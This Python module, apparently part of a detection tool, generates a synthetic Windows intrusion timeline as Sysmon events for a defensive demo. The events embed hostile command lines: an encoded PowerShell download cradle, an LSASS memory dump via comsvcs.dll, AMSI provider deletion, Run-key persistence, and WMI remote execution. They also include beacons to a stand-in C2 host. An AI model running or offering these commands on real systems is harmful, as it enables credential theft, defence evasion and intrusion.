"""Generador de un escenario de intrusión sintético, plausible y sin ambigüedad legal
(no reproduce IOCs ni herramientas de un actor de amenazas real, evitando cualquier
problema de atribución o de "receta operativa").

Narrativa (kill chain completa, ~38 minutos de actividad en un host):

  1. Acceso inicial   -- documento de Office con macro (phishing)
  2. Ejecucion         -- PowerShell con comando codificado, descarga un stager
  3. Persistencia      -- clave de registro Run
  4. Evasion de defensa -- deshabilita el logging de AMSI via registro
  5. Descubrimiento    -- whoami / net group "Domain Admins"
  6. Acceso a credenciales -- rundll32 + comsvcs.dll vuelca LSASS
  7. Movimiento lateral -- WMI hacia un segundo host
  8. Comando y control -- conexion saliente periodica hacia infraestructura externa

Entrelazado con ruido benigno realista (apertura normal de Office, Chrome,
Teams, logons legitimos) para que la demo no sea "todo es malicioso" -- eso es
lo que distingue un dataset de prueba honesto de un strawman.

Nota de fidelidad forense: cada evento incluye TODOS los campos que Sysmon
realmente adjunta (Image, ParentImage, ProcessGuid, ParentProcessGuid,
User...), no solo los que hacen falta para que "algo" matchee -- el objetivo
es que este dataset sea indistinguible en forma de un EVTX real exportado.
"""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta, timezone

from bluesentinel.domain.entities.windows_event import (
    SECURITY_LOGON,
    SYSMON_DNS_QUERY,
    SYSMON_FILE_CREATE,
    SYSMON_NETWORK_CONNECT,
    SYSMON_PROCESS_ACCESS,
    SYSMON_PROCESS_CREATE,
    SYSMON_REGISTRY_EVENT_SET,
    WindowsEvent,
)

HOST = "WKS-FINANCE-07"
USER = "CORP\\jsmith"
C2_IP = "185.220.101.42"
C2_DOMAIN = "update-cdn-service.net"
LATERAL_TARGET_HOST = "WKS-FINANCE-11"

_BASE_TIME = datetime(2026, 3, 14, 9, 12, 0, tzinfo=timezone.utc)


@dataclass(frozen=True, slots=True)
class ScenarioStage:
    """Metadato narrativo de una etapa del escenario, usado por la UI para
    anotar la linea temporal con la fase de la kill chain correspondiente."""

    name: str
    mitre_tactic: str
    description: str


def _t(offset_seconds: int) -> datetime:
    return _BASE_TIME + timedelta(seconds=offset_seconds)


def _process_event(
    offset: int,
    guid: str,
    parent_guid: str,
    image: str,
    command_line: str,
    parent_image: str = "",
    user: str = USER,
) -> WindowsEvent:
    return WindowsEvent.create(
        event_id=SYSMON_PROCESS_CREATE,
        channel="Microsoft-Windows-Sysmon/Operational",
        computer=HOST,
        provider="Microsoft-Windows-Sysmon",
        time_created=_t(offset),
        task_category="Process Create (rule: ProcessCreate)",
        event_data={
            "ProcessGuid": guid,
            "ParentProcessGuid": parent_guid,
            "Image": image,
            "CommandLine": command_line,
            "ParentImage": parent_image,
            "User": user,
        },
    )


def _network_event(
    offset: int, guid: str, image: str, dest_ip: str, dest_port: str, dest_host: str = ""
) -> WindowsEvent:
    data = {
        "ProcessGuid": guid,
        "Image": image,
        "DestinationIp": dest_ip,
        "DestinationPort": dest_port,
    }
    if dest_host:
        data["DestinationHostname"] = dest_host
    return WindowsEvent.create(
        event_id=SYSMON_NETWORK_CONNECT,
        channel="Microsoft-Windows-Sysmon/Operational",
        computer=HOST,
        provider="Microsoft-Windows-Sysmon",
        time_created=_t(offset),
        event_data=data,
    )


def generate_intrusion_scenario() -> list[WindowsEvent]:
    """Devuelve la lista completa de eventos del escenario, en orden cronologico."""
    events: list[WindowsEvent] = []
    explorer_img = r"C:\Windows\explorer.exe"

    events.append(
        WindowsEvent.create(
            event_id=SECURITY_LOGON,
            channel="Security",
            computer=HOST,
            provider="Microsoft-Windows-Security-Auditing",
            time_created=_t(-1800),
            task_category="Logon",
            event_data={"TargetUserName": "jsmith", "LogonType": "2", "IpAddress": "10.0.4.55"},
        )
    )
    events.append(_process_event(-1700, "{explorer}", "{winlogon}", explorer_img, "explorer.exe"))
    events.append(
        _process_event(
            -1650, "{teams}", "{explorer}", r"C:\Program Files\Teams\Teams.exe", "Teams.exe",
            parent_image=explorer_img,
        )
    )
    events.append(
        _process_event(
            -900, "{chrome}", "{explorer}", r"C:\Program Files\Google\Chrome\chrome.exe", "chrome.exe",
            parent_image=explorer_img,
        )
    )

    winword_img = r"C:\Program Files\Microsoft Office\WINWORD.EXE"
    events.append(
        _process_event(
            0, "{winword}", "{explorer}", winword_img,
            r'"WINWORD.EXE" /n "C:\Users\jsmith\Downloads\Q1_Invoice_Adjustment.docm"',
            parent_image=explorer_img,
        )
    )

    ps_img = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    events.append(
        _process_event(
            8, "{ps1}", "{winword}", ps_img,
            "powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8=",
            parent_image=winword_img,
        )
    )
    events.append(
        WindowsEvent.create(
            event_id=SYSMON_DNS_QUERY,
            channel="Microsoft-Windows-Sysmon/Operational",
            computer=HOST,
            provider="Microsoft-Windows-Sysmon",
            time_created=_t(9),
            event_data={
                "ProcessGuid": "{ps1}", "Image": ps_img, "QueryName": C2_DOMAIN, "QueryStatus": "0",
            },
        )
    )
    events.append(_network_event(10, "{ps1}", ps_img, C2_IP, "443", C2_DOMAIN))
    events.append(
        WindowsEvent.create(
            event_id=SYSMON_FILE_CREATE,
            channel="Microsoft-Windows-Sysmon/Operational",
            computer=HOST,
            provider="Microsoft-Windows-Sysmon",
            time_created=_t(11),
            event_data={
                "ProcessGuid": "{ps1}",
                "Image": ps_img,
                "TargetFilename": r"C:\Users\jsmith\AppData\Local\Temp\svchost_update.exe",
            },
        )
    )

    events.append(
        WindowsEvent.create(
            event_id=SYSMON_REGISTRY_EVENT_SET,
            channel="Microsoft-Windows-Sysmon/Operational",
            computer=HOST,
            provider="Microsoft-Windows-Sysmon",
            time_created=_t(14),
            event_data={
                "ProcessGuid": "{ps1}",
                "Image": ps_img,
                "TargetObject": r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper",
                "Details": r"C:\Users\jsmith\AppData\Local\Temp\svchost_update.exe",
            },
        )
    )

    events.append(
        WindowsEvent.create(
            event_id=SYSMON_REGISTRY_EVENT_SET,
            channel="Microsoft-Windows-Sysmon/Operational",
            computer=HOST,
            provider="Microsoft-Windows-Sysmon",
            time_created=_t(18),
            event_data={
                "ProcessGuid": "{ps1}",
                "Image": ps_img,
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}",
                "Details": "(Deleted)",
            },
        )
    )

    events.append(
        _process_event(
            22, "{whoami}", "{ps1}", r"C:\Windows\System32\whoami.exe", "whoami.exe /all",
            parent_image=ps_img,
        )
    )
    events.append(
        _process_event(
            25, "{netcmd}", "{ps1}", r"C:\Windows\System32\net.exe",
            'net.exe group "Domain Admins" /domain', parent_image=ps_img,
        )
    )

    rundll_img = r"C:\Windows\System32\rundll32.exe"
    events.append(
        _process_event(
            32, "{rundll}", "{ps1}", rundll_img,
            r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 636 C:\Users\Public\lsass_dbg.dmp full",
            parent_image=ps_img,
        )
    )
    events.append(
        WindowsEvent.create(
            event_id=SYSMON_PROCESS_ACCESS,
            channel="Microsoft-Windows-Sysmon/Operational",
            computer=HOST,
            provider="Microsoft-Windows-Sysmon",
            time_created=_t(33),
            event_data={
                "SourceProcessGUID": "{rundll}",
                "SourceImage": rundll_img,
                "TargetImage": r"C:\Windows\System32\lsass.exe",
                "GrantedAccess": "0x1410",
                "CallTrace": "C:\\Windows\\System32\\ntdll.dll+9d764|C:\\Windows\\System32\\KERNELBASE.dll+2e1a3",
            },
        )
    )

    events.append(_network_event(310, "{ps1}", ps_img, "10.0.4.61", "135", LATERAL_TARGET_HOST))
    wmic_img = r"C:\Windows\System32\wbem\WMIC.exe"
    events.append(
        _process_event(
            315, "{wmiexec}", "{ps1}", wmic_img,
            f'wmic.exe /node:"{LATERAL_TARGET_HOST}" process call create "cmd.exe /c whoami"',
            parent_image=ps_img,
        )
    )

    for minute_offset in (900, 1500, 2100):
        events.append(_network_event(minute_offset, "{ps1}", ps_img, C2_IP, "443", C2_DOMAIN))

    events.append(
        _process_event(
            400, "{outlook}", "{explorer}", r"C:\Program Files\Microsoft Office\OUTLOOK.EXE",
            "OUTLOOK.EXE", parent_image=explorer_img,
        )
    )
    updater_img = r"C:\Program Files\Vendor\ProductivitySuiteUpdater.exe"
    events.append(
        _process_event(
            1200, "{updater}", "{explorer}", updater_img, "ProductivitySuiteUpdater.exe -check",
            parent_image=explorer_img,
        )
    )
    events.append(
        _process_event(
            1205, "{ps_legit}", "{updater}", ps_img,
            "powershell.exe -enc dABlAHMAdAAtAG4AZQB0AGMAbwBuAG4AZQBjAHQAaQBvAG4A",
            parent_image=updater_img,
        )
    )

    events.sort(key=lambda e: e.time_created)
    return events


SCENARIO_STAGES: list[ScenarioStage] = [
    ScenarioStage("Acceso inicial", "initial-access", "Documento de Office con macro maliciosa"),
    ScenarioStage("Ejecucion", "execution", "PowerShell con comando codificado (stager)"),
    ScenarioStage("Persistencia", "persistence", "Clave de registro Run"),
    ScenarioStage("Evasion de defensa", "defense-evasion", "Manipulacion del proveedor AMSI"),
    ScenarioStage("Descubrimiento", "discovery", "Enumeracion de usuario y grupos privilegiados"),
    ScenarioStage("Acceso a credenciales", "credential-access", "Volcado de memoria de LSASS"),
    ScenarioStage("Movimiento lateral", "lateral-movement", "Ejecucion remota via WMI"),
    ScenarioStage("Comando y control", "command-and-control", "Beacons periodicos a infraestructura externa"),
]
